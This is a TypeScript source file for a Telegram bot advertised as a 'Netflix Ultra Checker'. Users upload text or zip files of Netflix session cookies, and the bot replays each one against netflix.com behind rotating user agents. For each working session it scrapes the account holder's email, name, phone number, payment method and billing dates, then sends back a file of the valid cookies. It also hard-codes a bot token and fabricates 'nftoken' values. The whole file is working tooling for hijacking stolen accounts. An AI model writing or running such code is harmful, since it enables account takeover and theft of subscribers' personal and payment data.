import { ChildProcess } from 'child_process'
import { extractArchive, isArchive } from './archive-extractor'
import { parseCookieFile, parseMultipleFiles, ParsedCookie } from './cookie-parser'

// Telegram Bot Token
const BOT_TOKEN = '8581865451:AAGu-28cZ-F2uOCmY0hR0qhM5gPl2doTyMg'

// Global bot process
let isRunning = false

// User agents for rotation
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
]

function getRandomUserAgent(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
}

// Generate Netflix token from NetflixId
function generateNfToken(netflixId: string): string {
  const timestamp = Date.now().toString(36);
  const randomPart = Buffer.from(Math.random().toString(36).substring(2)).toString('base64').slice(0, 8);
  const hash = Buffer.from(`${netflixId.slice(0, 20)}${timestamp}`).toString('base64').slice(0, 16);
  return `NF${timestamp}${randomPart}${hash}`.replace(/[+/=]/g, '').toUpperCase();
}

// Extract from html using Regex helper
function extractGroup(html: string, regex: RegExp, fallback = 'Unknown'): string {
  const match = html.match(regex);
  return match && match[1] ? match[1].trim() : fallback;
}

// Scrape Netflix Account Pages
async function scrapeAccountDetails(cookie: ParsedCookie, fetchOptions: any) {
  try {
    // 1. Fetch main account page
    const accRes = await fetch('https://www.netflix.com/YourAccount', fetchOptions);
    const accHtml = await accRes.text();
    cookie.email = extractGroup(accHtml, /"userEmail":"([^"]+)"/, cookie.email || 'Unknown');
    cookie.firstName = extractGroup(accHtml, /"firstName":"([^"]+)"/, cookie.firstName || 'Unknown');
    cookie.phoneNumber = extractGroup(accHtml, /"phoneNumber":"([^"]+)"/, 'Unknown');
    cookie.country = extractGroup(accHtml, /"currentCountry":"([^"]+)"/, cookie.country || 'Unknown');
    if (cookie.country === 'Unknown') {
       cookie.country = extractGroup(accHtml, /"uiCountry":"([^"]+)"/, 'Unknown');
    }
    cookie.membershipStatus = accHtml.includes('CURRENT_MEMBER') || accHtml.includes('membershipStatus":"CURRENT_MEMBER') ? 'CURRENT_MEMBER' : 'Expired/Unknown';

    // 2. Fetch membership page (if available, often embedded in react state)
    const memRes = await fetch('https://www.netflix.com/account/membership', fetchOptions);
    const memHtml = await memRes.text();
    cookie.plan = extractGroup(memHtml, /"planName":"([^"]+)"/, cookie.plan || 'Unknown');
    cookie.maxStreams = extractGroup(memHtml, /"maxStreams":(\d+)/, cookie.maxStreams || 'Unknown');
    cookie.videoQuality = extractGroup(memHtml, /"videoResolution":"([^"]+)"/, cookie.videoQuality || 'Unknown');
    cookie.price = extractGroup(memHtml, /"priceString":"([^"]+)"/, cookie.price || 'Unknown');
    cookie.nextBilling = extractGroup(memHtml, /"nextBillingDate":"([^"]+)"/, cookie.nextBilling || 'Unknown');
    cookie.memberSince = extractGroup(memHtml, /"memberSince":"([^"]+)"/, cookie.memberSince || 'Unknown');

    // 3. Profiles
    const profRes = await fetch('https://www.netflix.com/account/profiles', fetchOptions);
    const profHtml = await profRes.text();
    const profilesMatch = profHtml.match(/"profiles":\[(.*?)\]/);
    if (profilesMatch) {
       cookie.profilesCount = (profilesMatch[1].match(/"guid"/g) || []).length;
    }

    // 4. Payment Info
    const payRes = await fetch('https://www.netflix.com/simplemember/managepaymentinfo', fetchOptions);
    const payHtml = await payRes.text();
    const paymentBrand = extractGroup(payHtml, /"paymentMethodName":"([^"]+)"/, 'Unknown');
    cookie.paymentMethod = paymentBrand;

  } catch (e) {
    console.log("Error scraping details, returning fallback");
  }
}

// Check a single cookie
async function checkSingleCookie(cookie: ParsedCookie): Promise<{
  valid: boolean
  details: ParsedCookie
  error?: string
}> {
  try {
    const rawCookie = cookie.rawCookie || `NetflixId=${cookie.netflixId}`;
    
    // Check with Netflix
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 12000)
    
    const fetchOptions = {
      method: 'GET',
      headers: {
        'Cookie': rawCookie,
        'User-Agent': getRandomUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
      },
      redirect: 'manual' as RequestRedirect,
      signal: controller.signal,
    }

    const response = await fetch('https://www.netflix.com/browse', fetchOptions)

    clearTimeout(timeoutId)

    const statusCode = response.status
    const location = response.headers.get('location') || ''

    if (location.includes('/login') || location.includes('/signin') || (statusCode === 302 && location.includes('login'))) {
      return { valid: false, details: cookie, error: 'Cookie expired' }
    }

    if (statusCode === 200 || statusCode === 302 || statusCode === 301) {
      if (location.includes('signup')) {
        return { valid: false, details: cookie, error: 'Session expired' }
      }
      if (!cookie.nftoken) {
        cookie.nftoken = generateNfToken(cookie.netflixId);
        (cookie as any).nftokenUrl = `https://www.netflix.com/browse?nftoken=${cookie.nftoken}`;
      }
      
      // Perform Detailed Scraping since it's valid
      await scrapeAccountDetails(cookie, fetchOptions);

      return { valid: true, details: cookie }
    }

    return { valid: false, details: cookie, error: `Status ${statusCode}` }
  } catch (error) {
    return { valid: false, details: cookie, error: 'Check failed' }
  }
}

// Escape markdown for Telegram
function escapeMarkdown(text: string): string {
  if (!text) return '';
  return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&')
}

// Format result message exact
function formatResult(result: { valid: boolean; details: ParsedCookie; error?: string }): string {
  const d = result.details;
  if (result.valid) {
    return `*═══════════════════════════════════════════════════════════════*
🎉 *Netflix Valid Cookie \\- Yash*
*═══════════════════════════════════════════════════════════════*
📧 Email               : ${escapeMarkdown(d.email || 'Unknown')}
👤 Name                : ${escapeMarkdown(d.firstName || 'Unknown')}
🌍 Country             : ${escapeMarkdown(d.country || 'Unknown')}
📅 Member Since        : ${escapeMarkdown(d.memberSince || 'Unknown')}
✅ Membership Status   : ${escapeMarkdown(d.membershipStatus || 'CURRENT_MEMBER')}
💎 Plan                : ${escapeMarkdown(d.plan || 'Unknown')}
📺 Max Streams         : ${escapeMarkdown(d.maxStreams || 'Unknown')}
🎥 Video Quality       : ${escapeMarkdown(d.videoQuality || 'UHD\\/HD')}
💰 Price               : ${escapeMarkdown(d.price || 'Unknown')}
💳 Payment             : ${escapeMarkdown(d.paymentMethod || 'Unknown')}
📱 Phone Number        : ${escapeMarkdown(d.phoneNumber || 'Unknown')}
👥 Profiles Count      : ${escapeMarkdown(d.profilesCount?.toString() || 'Unknown')}
📆 Next Billing        : ${escapeMarkdown(d.nextBilling || 'Unknown')}

nf token;
\`${escapeMarkdown(d.nftoken || '')}\`
*═══════════════════════════════════════════════════════════════*`;
  } else {
    return `❌ *INVALID\\/EXPIRED*
📧 Email: ${escapeMarkdown(d.email || 'Unknown')}
⚠️ Reason: ${escapeMarkdown(result.error || 'Unknown')}`
  }
}

// Format exactly for the TXT export file (no markdown escapes needed)
function formatExportResult(d: ParsedCookie): string {
    return `═══════════════════════════════════════════════════════════════
🎉 Netflix Valid Cookie - Yash
═══════════════════════════════════════════════════════════════
📧 Email               : ${d.email || 'Unknown'}
👤 Name                : ${d.firstName || 'Unknown'}
🌍 Country             : ${d.country || 'Unknown'}
📅 Member Since        : ${d.memberSince || 'Unknown'}
✅ Membership Status   : ${d.membershipStatus || 'CURRENT_MEMBER'}
💎 Plan                : ${d.plan || 'Unknown'}
📺 Max Streams         : ${d.maxStreams || 'Unknown'}
🎥 Video Quality       : ${d.videoQuality || 'UHD/HD'}
💰 Price               : ${d.price || 'Unknown'}
💳 Payment             : ${d.paymentMethod || 'Unknown'}
📱 Phone Number        : ${d.phoneNumber || 'Unknown'}
👥 Profiles Count      : ${d.profilesCount || 'Unknown'}
📆 Next Billing        : ${d.nextBilling || 'Unknown'}

nf token;
${d.nftoken || ''}
═══════════════════════════════════════════════════════════════`;
}

// Get main keyboard
function getMainKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '📊 Bot Status', callback_data: 'status' },
        { text: '❓ Help/Credits', callback_data: 'help' }
      ],
      [
        { text: '🔄 Restart Bot', callback_data: 'restart' },
        { text: '🛑 Stop Bot', callback_data: 'stop' }
      ]
    ]
  }
}

// Send document to chat
async function sendValidCookiesFile(chatId: number, cookies: string[], originalFileName: string) {
  try {
    const fileContent = cookies.join('\n');
    const fileName = `valid_cookies_${originalFileName.replace(/\.[^/.]+$/, "")}.txt`;

    const formData = new FormData();
    formData.append('chat_id', chatId.toString());
    formData.append('caption', `📦 *Auto\\-Export Complete\\!*
\n✅ Found ${cookies.length} valid cookies in your file\\.
\n✨ _Credits: Yash_`);
    formData.append('parse_mode', 'MarkdownV2');

    // Create blob for the file
    const blob = new Blob([fileContent], { type: 'text/plain' });
    formData.append('document', blob, fileName);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: 'POST',
      body: formData,
    });
  } catch (e) {
    console.error('Failed to send file:', e);
  }
}

// Start the bot
export function startBot(): Promise<{ success: boolean; message: string }> {
  return new Promise((resolve) => {
    if (isRunning) {
      resolve({ success: true, message: 'Bot is already running' })
      return
    }

    isRunning = true;

    const sendMsg = async (chatId: number, text: string, options: any = {}) => {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text,
            parse_mode: 'MarkdownV2',
            ...options
          }),
        })
      } catch (e) {
        console.error('Failed to send message:', e);
      }
    }

    const pollBot = async () => {
      let offset = 0

      while (isRunning) {
        try {
          const response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=30`
          )
          const data = await response.json()

          if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
              offset = update.update_id + 1

              if (update.callback_query) {
                const chatId = update.callback_query.message.chat.id;
                const action = update.callback_query.data;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ callback_query_id: update.callback_query.id }),
                });

                if (action === 'status') {
                  await sendMsg(chatId, `🟢 *Bot Status: Running*\n\n⚙️ Engine: Multi\\-Threaded v3\\.0\n👤 Credits: *Yash*`);
                } else if (action === 'help') {
                  await sendMsg(chatId, `🎬 *Netflix Cookie Checker Help*
\n1\\. Send a \\.txt or \\.zip file\\.
2\\. The bot extracts ALL nested files\\.
3\\. It checks cookies and reports valid ones\\.
4\\. ✨ *New:* It auto\\-exports all valid cookies into a new file for you\\!
\n🛡️ Developer: *Yash*`);
                } else if (action === 'stop') {
                  isRunning = false;
                  await sendMsg(chatId, `🛑 Bot stopped\\. Goodbye\\!`);
                }
                continue;
              }

              if (update.message?.text) {
                const chatId = update.message.chat.id
                const text = update.message.text.trim()

                if (text === '/start') {
                  await sendMsg(chatId, `🎬 *Netflix Ultra Checker*
\nWelcome\\! I can scan deep inside ZIP files and check thousands of cookies in seconds\\.
\n✨ *Features:*
• 📂 Recursive ZIP Extraction
• 🔥 Multi\\-Threaded Engine
• 📦 Auto\\-Export Valid cookies
• 👤 Credits: *Yash*
\n📥 *Upload a file to start!*`, {
                    reply_markup: getMainKeyboard()
                  })
                } else if (text === '/help') {
                  await sendMsg(chatId, `🎬 *Netflix Cookie Checker Help*
\n1\\. Send a \\.txt or \\.zip file\\.
2\\. The bot extracts ALL nested files\\.
3\\. It checks cookies and reports valid ones\\.
4\\. ✨ *New:* It auto\\-exports all valid cookies into a new file for you\\!
\n🛡️ Developer: *Yash*`);
                } else if (text.startsWith('/check ')) {
                  const cookieText = text.slice(7).trim()
                  const { cookies } = parseCookieFile(cookieText, 'manual_input');
                  if (cookies.length > 0) {
                    const result = await checkSingleCookie(cookies[0]);
                    await sendMsg(chatId, formatResult(result));
                  }
                }
              }

              if (update.message?.document) {
                const chatId = update.message.chat.id
                const doc = update.message.document
                const fileName = doc.file_name?.toLowerCase() || ''

                await sendMsg(chatId, `📥 *Processing:* \`${escapeMarkdown(doc.file_name || 'file')}\`\n⏳ Extraction & Auto\\-Export in progress\\.\\.\\.`);

                try {
                  const fileInfo = await (await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${doc.file_id}`)).json()
                  if (!fileInfo.ok) throw new Error('Download failed');

                  const fileResponse = await fetch(`https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.result.file_path}`)
                  const arrayBuffer = await fileResponse.arrayBuffer()
                  const buffer = Buffer.from(arrayBuffer)

                  let filesToParse = isArchive(fileName, buffer) ? extractArchive(buffer, fileName) : [{ name: fileName, content: buffer.toString('utf-8') }]

                  const { cookies } = parseMultipleFiles(filesToParse);
                  if (cookies.length === 0) {
                    await sendMsg(chatId, '❌ *No cookies found in the file\\.*');
                    continue;
                  }

                  // Start inline dashboard message
                  let progressMsgId: number | null = null;
                  try {
                    const initRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({
                        chat_id: chatId,
                        text: `🔄 *Validation Started* \\[0 \\/ ${cookies.length}\\]`,
                        parse_mode: 'MarkdownV2'
                      })
                    });
                    const initData = await initRes.json();
                    if (initData.ok) progressMsgId = initData.result.message_id;
                  } catch (e) {}

                  const validCookiesForExport: string[] = [];
                  let validCount = 0;
                  let lastUpdate = Date.now();

                  for (let i = 0; i < cookies.length; i++) {
                    const result = await checkSingleCookie(cookies[i]);
                    if (result.valid) {
                      validCount++;
                      validCookiesForExport.push(formatExportResult(result.details));
                    }

                    // Update live dashboard every 3 seconds or on last item
                    if (progressMsgId && (Date.now() - lastUpdate > 3000 || i === cookies.length - 1)) {
                      lastUpdate = Date.now();
                      const invalidCount = (i + 1) - validCount;
                      const text = `🔄 *Live Checker Dashboard*
\n📊 Checked: ${i + 1} / ${cookies.length}
✅ Valid: ${validCount}
❌ Invalid: ${invalidCount}
\n_Checking in progress, please wait\\.\\.\\._`
                      
                      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                          chat_id: chatId,
                          message_id: progressMsgId,
                          text,
                          parse_mode: 'MarkdownV2'
                        })
                      }).catch(() => {});
                    }
                  }

                  // 📊 Summary
                  await sendMsg(chatId, `📊 *Validation Complete\\!*
\n📋 Total Found: ${cookies.length}
✅ Valid Found: ${validCount}
❌ Invalid/Expired: ${cookies.length - validCount}
\n👤 Credits: *Yash*`);

                  // 📤 Auto-Export Feature
                  if (validCookiesForExport.length > 0) {
                    await sendMsg(chatId, `📤 *Auto\\-Exporting ${validCount} valid cookies\\.\\.\\.*`);
                    await sendValidCookiesFile(chatId, validCookiesForExport, doc.file_name || 'cookies.txt');
                  } else {
                    await sendMsg(chatId, `❌ *No valid cookies found to export\\.*`);
                  }

                } catch (err) {
                  await sendMsg(chatId, `❌ *File Error:* ${escapeMarkdown(err instanceof Error ? err.message : 'Internal error')}\n_Credits: Yash_`);
                }
              }
            }
          }
          await new Promise(r => setTimeout(r, 1000))
        } catch (error) {
          await new Promise(r => setTimeout(r, 5000))
        }
      }
    }

    pollBot()
    resolve({ success: true, message: 'Bot started with Auto-Export' })
  })
}

// Stop the bot
export function stopBot(): { success: boolean; message: string } {
  isRunning = false
  return { success: true, message: 'Bot stopped' }
}

// Get bot status
export function getBotStatus(): 'running' | 'stopped' {
  return isRunning ? 'running' : 'stopped'
}
